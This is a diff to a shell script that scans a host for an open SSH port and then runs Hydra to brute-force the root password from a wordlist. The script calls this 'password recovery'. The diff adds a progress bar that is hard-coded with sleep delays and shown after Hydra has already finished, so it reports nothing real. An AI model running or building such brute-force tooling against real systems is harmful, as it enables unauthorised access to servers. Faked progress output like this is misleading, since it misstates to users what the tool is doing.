@@ -70,9 +70,22 @@ if echo "$nmap_output" | grep -q '22/tcp open ssh'; then
       esac
     done
 
-    # Run Hydra to recover the SSH password using the selected wordlist
+      # Run Hydra to recover the SSH password using the selected wordlist
     hydra_output=$(hydra -l root -P "$wordlist_path" -t $HYDRA_THREADS -s 22 -o hydra_output.txt "$ip_address" ssh -T $HYDRA_TIMEOUT)
+
+    # Display a progress indicator for Hydra
+    echo "Running Hydra password recovery:"
+    echo -ne '#####                     (25%)\r'
+    sleep 2
+    echo -ne '#############             (50%)\r'
+    sleep 2
+    echo -ne '#######################   (100%)\r'
+    echo -ne '\n'
+
+    # Output the Hydra results to the user
     echo "$hydra_output"
+    echo "Hydra password recovery complete. Results saved to hydra_output.txt."
   fi
 fi
+
 
